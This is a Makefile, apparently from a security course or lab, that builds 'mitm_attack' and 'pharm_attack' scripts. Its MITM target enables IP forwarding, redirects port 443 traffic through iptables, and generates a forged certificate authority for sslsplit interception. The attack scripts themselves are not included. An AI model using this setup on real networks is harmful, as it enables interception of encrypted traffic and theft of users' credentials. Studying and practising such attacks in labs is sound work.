MITM  = mitm_attack
PHARM = pharm_attack

MITM_FILE  = mitm_attack.py
PHARM_FILE = pharm_attack.py

DIR    = sslsplit-log
KEY    = ca.key
CRT    = ca.crt
CONFIG = ssl.conf

all: $(MITM) $(PHARM)

$(MITM): $(MITM_FILE)
	cp $< $@ && chmod +x $@
	sudo sysctl -w net.ipv4.ip_forward=1
	sudo iptables -t nat -F
	sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
	mkdir -p $(DIR)
	openssl genrsa -out $(KEY) 4096
	openssl req -new -x509 -days 1826 -key $(KEY) -out $(CRT) -config $(CONFIG)

$(PHARM): $(PHARM_FILE)
	cp $< $@ && chmod +x $@

clean:
	sudo sysctl -w net.ipv4.ip_forward=0
	sudo iptables -t nat -F
	rm -rf $(DIR) $(MITM) $(PHARM) $(KEY) $(CRT)